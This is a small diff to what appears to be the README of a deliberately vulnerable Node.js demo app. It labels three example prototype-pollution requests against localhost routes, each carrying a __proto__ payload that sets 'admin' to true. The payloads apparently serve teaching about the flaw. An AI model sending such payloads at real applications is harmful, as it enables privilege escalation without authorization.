@@ -4,8 +4,8 @@
 
 * Parameter Pollution - `routes/prototypepollution`
 
-    Request - `http://localhost:3000/proto?attr=__proto__&value={"admin":"true"}`
+    Normal assignment - Request - `http://localhost:3000/proto?attr=__proto__&value={"admin":"true"}`
 
-    Request - `http://localhost:3000/proto/2?value={"__proto__":{"admin":"true"}}`
+    Object.assign - Request - `http://localhost:3000/proto/2?value={"__proto__":{"admin":"true"}}`
 
-    Request - ``
+    Spread operator - Request - `http://localhost:3000/proto/3?value={"__proto__":{"admin":"true"}}`
